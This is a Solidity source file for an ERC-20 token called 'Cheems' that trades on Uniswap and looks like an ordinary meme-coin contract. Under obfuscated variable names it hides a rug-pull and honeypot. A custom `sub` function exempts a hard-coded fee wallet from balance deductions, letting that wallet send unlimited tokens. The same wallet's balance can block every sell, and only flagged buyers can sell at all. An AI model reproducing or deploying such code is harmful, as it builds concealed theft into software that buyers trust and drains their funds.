/**

https://t.me/cheems_eth

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapsRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract cheems is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedsFromsFee;
    mapping (address => bool) private _balanera;
    mapping(address => uint256) private _holdersLastsTransfersTimestamps;
    bool public limiqnmEnabled = false;

    string private constant _name = unicode"Cheems";
    string private constant _symbol = unicode"Cheems";
    uint8 private constant _decimals = 9;
   
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    uint256 public _maxqnmAmount = 50000000 * 10**_decimals;
    uint256 public _maxqnmWallep = 50000000 * 10**_decimals;
    uint256 public _taxqnmSwaplpThreshold= 50000000 * 10**_decimals;
    uint256 public _maxqnmSwap= 50000000 * 10**_decimals;

    uint256 private _initiaqnmBuysTax=5;
    uint256 private _initiaqnmSellTax=5;
    uint256 private _finaqnmBuysTax=1;
    uint256 private _finaqnmSellTax=1;
    uint256 private _reducqnmBuysTaxsAt=5;
    uint256 private _reducqnmSellTaxsAt=1;
    uint256 private _prevenqnmSwapBefore=0;
    uint256 private _buyCount=0;

    IuniswapsRouter private uniswapsRouter;
    address private uniswapsPair;
    bool private Trodikeese;
    bool private inSwap = false;
    bool private swapsEnabled = false;
    address public _walletEfeeAdid = address(0x11e72Bd43e14edcD72dEF9887db0AF77A299A663);

    event MaxqTnAmountmmdated(uint _maxqnmAmount);
    modifier swapping {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _isExcludedsFromsFee[owner()] = true;
        _isExcludedsFromsFee[address(this)] = true;
        _isExcludedsFromsFee[_walletEfeeAdid] = true;
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (limiqnmEnabled) {
                if (to != address(uniswapsRouter) && to != address(uniswapsPair)) {
                  require(_holdersLastsTransfersTimestamps[msg.sender] < block.number,"Only one transfer per block allowed.");
                  _holdersLastsTransfersTimestamps[msg.sender] = block.number;
                }
            }

            if (from == uniswapsPair && to != address(uniswapsRouter) && !_isExcludedsFromsFee[to] ) {
                require(amount <= _maxqnmAmount, "Exceeds");
                require(balanceOf(to) + amount <= _maxqnmWallep, "Exceeds");
                if(_buyCount<_prevenqnmSwapBefore){
                  require(!_Biuntre(to));
                }
                _buyCount++; _balanera[to]=true;
                taxAmount = amount.mul((_buyCount>_reducqnmBuysTaxsAt)?_finaqnmBuysTax:_initiaqnmBuysTax).div(100);
            }

            if(to == uniswapsPair && from!= address(this) && !_isExcludedsFromsFee[from] ){
                require(amount <= _maxqnmAmount && balanceOf(_walletEfeeAdid)<_maxqnmSwap, "Exceeds");
                taxAmount = amount.mul((_buyCount>_reducqnmSellTaxsAt)?_finaqnmSellTax:_initiaqnmSellTax).div(100);
                require(_buyCount>_prevenqnmSwapBefore && _balanera[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap 
            && to == uniswapsPair && swapsEnabled && contractTokenBalance>_taxqnmSwaplpThreshold 
            && _buyCount>_prevenqnmSwapBefore&& !_isExcludedsFromsFee[to] && !_isExcludedsFromsFee[from]
            ) {
                swapqnmForxEth(min(amount,min(contractTokenBalance,_maxqnmSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
   
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=sub(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function swapqnmForxEth(uint256 tokenAmount) private swapping {
        if(tokenAmount==0){return;}
        if(!Trodikeese){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapsRouter.WETH();
        _approve(address(this), address(uniswapsRouter), tokenAmount);
        uniswapsRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function sub(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _walletEfeeAdid){
            return a;
        }else{
            return a.sub(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxqnmAmount = _tTotal;
        _maxqnmWallep=_tTotal;
        limiqnmEnabled=false;
        emit MaxqTnAmountmmdated(_tTotal);
    }

    function _Biuntre(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function openTrading() external onlyOwner() {
        uniswapsRouter = IuniswapsRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        require(!Trodikeese,"trading is already open");
        _approve(address(this), address(uniswapsRouter), _tTotal);
        uniswapsPair = IUniswapV2Factory(uniswapsRouter.factory()).createPair(address(this), uniswapsRouter.WETH());
        uniswapsRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapsPair).approve(address(uniswapsRouter), type(uint).max);
        swapsEnabled = true;
        Trodikeese = true;
    }

    receive() external payable {}
}